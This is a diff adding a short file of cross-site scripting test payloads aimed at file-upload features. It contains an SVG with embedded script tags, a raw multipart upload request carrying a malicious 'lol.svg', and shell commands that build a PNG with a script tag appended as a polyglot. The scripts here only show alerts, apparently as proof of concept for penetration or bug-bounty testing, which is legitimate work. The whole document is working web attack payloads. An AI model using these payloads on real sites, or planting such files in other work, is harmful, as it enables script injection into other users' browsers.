@@ -1,0 +1,21 @@
+<svg xmlns="http://www.w3.org/2000/svg"> <script> alert('You are Vulnerable to XSS'); console.log('You are Vulnerable to XSS'); </script></svg>
+
+
+
+------WebKitFormBoundary19bIZtEQLAtfLG9m
+Content-Disposition: form-data; name="file"; filename="lol.svg"
+Content-Type: image/svg+xml
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert('XSS')</script>
+  <script>console.log('XSS');</script>
+</svg>
+------WebKitFormBoundary19bIZtEQLAtfLG9m--
+
+
+
+echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > xxs.png
+echo -n "<script> alert('You are Vulnerable to XSS'); console.log('You are Vulnerable to XSS'); </script><" >> xxs.png
+
+
+
